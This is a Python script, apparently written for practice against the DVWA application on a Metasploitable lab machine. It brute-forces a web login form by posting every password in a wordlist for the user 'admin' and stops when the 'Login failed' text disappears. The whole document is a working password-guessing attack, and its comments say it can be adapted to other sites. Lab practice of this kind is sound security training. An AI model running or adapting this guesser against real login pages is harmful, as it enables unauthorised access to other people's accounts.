#! /usr/bin/env python
# Compatibility: Python 3.x
# The script is intended for use on DVWA web app on Metasplotable. It's important to note this script requires
# customization depending on which site we want to use it on.
# Keep in mind that if there is captcha or a firewall that blocks too many login attempts, this guesser won't work.

import requests

# URL of the page where login POST request can be sent.
target_url = "http://10.0.2.4/dvwa/login.php"

# Dictionary keys refer to the "name" attribute in HTML submit classes (POST request form),
# username and password by default. The last one refers to the button we use to submit data.
# TODO: add common usernames list.
login_data = {"username": "admin", "password": "", "Login": "submit"}

with open("../../resources/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        login_data["password"] = word
        response = requests.post(target_url, data=login_data)
        if "Login failed" not in response.content.decode(errors="ignore"):
            print(f"[+] Found correct password --> {word}")
            exit()

print("[-] Reached end of file. No password has been found.")
